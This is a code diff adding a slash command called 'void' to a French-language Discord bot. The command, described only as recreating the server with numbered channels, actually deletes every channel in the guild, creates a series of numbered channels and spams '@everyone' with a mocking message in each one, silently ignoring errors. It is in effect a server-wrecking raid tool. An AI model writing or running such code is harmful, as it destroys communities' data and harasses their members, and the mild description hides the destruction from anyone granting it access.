@@ -104,5 +104,39 @@ async def polios(
     await interaction.followup.send("Paramètres incorrects.", ephemeral=True)
 
 
+@tree.command(name="void", description="Recrée le serveur avec plusieurs salons numérotés.")
+@app_commands.describe(
+    nombre="Nombre de salons à créer (défaut : 20)",
+    message="Message à envoyer dans chaque salon (optionnel)"
+)
+async def void(
+    interaction: discord.Interaction,
+    nombre: int = 20,
+    message: str = "HAHAHAHAHAAHAHAHA"
+):
+    if not is_owner(interaction):
+        await interaction.response.send_message("Permission refusée.", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    guild = interaction.guild
+
+    # Supprime tous les salons existants
+    await asyncio.gather(*[delete_channel(c) for c in guild.channels])
+
+    # Crée les salons numérotés et ping @everyone dedans
+    created = 0
+    for i in range(1, nombre + 1):
+        try:
+            channel = await guild.create_text_channel(str(i))
+            await channel.send(f"@everyone {message}")
+            created += 1
+        except Exception:
+            pass
+
+    await interaction.followup.send(f"✅ {created} salon(s) créé(s) avec @everyone pingé dedans.", ephemeral=True)
+
+
 if __name__ == "__main__":
     bot.run(TOKEN)
